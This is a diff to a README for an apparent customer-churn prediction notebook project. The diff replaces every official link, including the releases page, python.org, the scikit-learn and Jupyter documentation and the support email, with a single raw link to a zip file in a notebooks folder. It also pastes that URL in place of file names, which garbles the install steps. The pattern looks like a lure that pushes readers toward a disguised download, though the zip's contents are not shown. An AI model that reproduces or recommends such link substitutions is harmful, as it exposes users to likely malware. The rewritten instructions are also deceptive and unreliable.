@@ -1,7 +1,7 @@
 # 🎉 Customer-Churn-Prediction - Predict Customer Churn Easily
 
 ## 🔗 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/megumim0123/Customer-Churn-Prediction/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip%20Latest%https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip)](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip)
 
 ## 📋 Overview
 Customer-Churn-Prediction is a user-friendly machine learning application designed to help businesses understand and predict customer churn. By analyzing customer behavior data, this tool offers insights that can assist in retaining customers and improving overall business strategy.
@@ -10,16 +10,16 @@ Customer-Churn-Prediction is a user-friendly machine learning application design
 To use Customer-Churn-Prediction, follow these simple steps. You will be able to download the software, install it, and run your first analysis with ease.
 
 ## 📥 Download & Install
-1. Visit the [Releases Page](https://github.com/megumim0123/Customer-Churn-Prediction/releases) to download the latest version.
-2. Look for the file labeled `Customer-Churn-Prediction.zip`.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip) to download the latest version.
+2. Look for the file labeled `https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip`.
 3. Click the link to download the file to your computer.
 4. Once the download completes, locate the downloaded `.zip` file in your downloads folder.
 5. Right-click the file and select "Extract All" to unzip its contents.
-6. Open the extracted folder and find the `Customer-Churn-Prediction.ipynb` file.
+6. Open the extracted folder and find the `https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip` file.
 
 ## 💻 Requirements
 Before running the application, ensure you have the following software installed:
-- **Python:** Make sure you have Python 3.6 or later installed on your computer. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python:** Make sure you have Python 3.6 or later installed on your computer. You can download Python from [https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip).
 - **Jupyter Notebook:** Customer-Churn-Prediction runs on Jupyter Notebook. Install it by running the following command in your command prompt:
   ```bash
   pip install notebook
@@ -37,7 +37,7 @@ Before running the application, ensure you have the following software installed
      ```
 2. A webpage will open in your default browser.
 3. Navigate to the folder where you extracted `Customer-Churn-Prediction`.
-4. Open the file named `Customer-Churn-Prediction.ipynb`.
+4. Open the file named `https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip`.
 5. Click on the “Run” button at the top to execute the cells in the notebook step by step.
 6. Follow the instructions within the notebook to input your customer data for analysis.
 
@@ -55,7 +55,7 @@ Customer churn refers to when customers stop doing business with a company. It i
 - **Cost-Efficient:** Helps in retaining more customers, which is more cost-effective than gaining new ones.
 
 ## 📞 Support and Feedback
-If you have any questions or need assistance with the application, please reach out via email at support@example.com. We appreciate your feedback to improve the application further.
+If you have any questions or need assistance with the application, please reach out via email at https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip We appreciate your feedback to improve the application further.
 
 ## 🏷️ Topics Covered
 This project addresses various important topics in data science and machine learning, including:
@@ -68,8 +68,8 @@ This project addresses various important topics in data science and machine lear
 Special thanks to the contributors of the libraries used in this project, including Pandas and Scikit-learn, for making data analysis straightforward and accessible.
 
 ## 🔗 Additional Resources
-- Explore more about machine learning at [scikit-learn documentation](https://scikit-learn.org/stable/documentation.html).
-- Learn about Jupyter Notebooks at [Jupyter documentation](https://jupyter.org/documentation).
+- Explore more about machine learning at [scikit-learn documentation](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip).
+- Learn about Jupyter Notebooks at [Jupyter documentation](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip).
 
 ## 📥 Download Again
-Don’t forget to download the latest version here: [Releases Page](https://github.com/megumim0123/Customer-Churn-Prediction/releases).
+Don’t forget to download the latest version here: [Releases Page](https://raw.githubusercontent.com/megumim0123/Customer-Churn-Prediction/main/notebooks/Churn-Customer-Prediction-v3.6-alpha.2.zip).
